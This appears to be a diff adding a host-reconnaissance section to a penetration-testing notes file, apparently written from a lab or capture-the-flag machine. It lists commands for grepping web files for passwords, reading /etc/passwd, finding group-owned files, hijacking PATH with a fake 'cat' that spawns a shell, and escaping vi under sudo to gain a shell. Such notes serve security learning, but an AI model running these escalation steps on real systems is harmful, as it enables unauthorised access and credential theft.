@@ -455,6 +455,70 @@ It’s called “brute-force” because it doesn’t rely on logic or discovery 
 ---
 
 ### **Host-Based Reconnaissance** ==**(Work In Progress)**==
+
+	Websites are usually located in /var/www/html/
+		$ cat /var/www/html/* | grep -i passw*
+	Identify users on the system
+	
+	$ cat /etc/passwd
+	
+	$ cat /etc/group
+	
+	Getting the UserID can help understand the user role and permissions
+	
+	$ id
+	
+	If you identify interesting groups your user has access to, investigate further what files this group has access to
+	
+	$ find / -user username 2>/dev/null
+	
+	$ find / -group groupname 2>/dev/null
+	
+	$ find / -user username -group groupname -ls
+	
+	Exploit programs owned by other users if the permissions have SUIDs (-rw**s**r-xr--)
+	
+	- If you can run these files as another user, it is possible to missuse them
+	
+	Remote shell redirecting $PATH is useful here
+	
+> 	create an exec file with the name of the command that the program runs, to create a shell with program owners' permissions. For example, if the program runs ‘cat’
+	
+	$ touch /tmp/cat
+	
+	$ echo /bin/sh | tee -a /tmp/cat
+	
+> 	Set system PATH to our file directory:
+	
+	$ export PATH=/tmp:$PATH
+	
+	If the machine uses both PHP & SQL, there should be credentials in clear text:
+	
+	Consider reviewing files inside /var/www/html
+	
+	Executing sudo -l would provide permissions denial to escalate. Identified commands allowed for user:
+	
+	$ sudo -l
+	
+	User postgres may run the following commands on vaccine:
+	
+	(ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
+	
+	Using [https://gtfobins.github.io/gtfobins/vi/#sudo](https://gtfobins.github.io/gtfobins/vi/#sudo) we can see how to abuse privileges from vulnerable commands.
+	
+	for this scenario, we set shell to /bin/sh
+	
+	:set shell=/bin/sh
+	
+	Then we run the shell
+	
+	:shell
+	
+	We can now beautify our shell again:
+	
+	$ python3 -c 'import pty;pty.spawn("/bin/bash")'
+
+
 ### **Wireless Reconnaissance** ==**(Work In Progress)**==
 ### **Cloud Reconnaissance** ==**(Work In Progress)**==
 ### **Application-Specific Recon** ==**(Work In Progress)**==
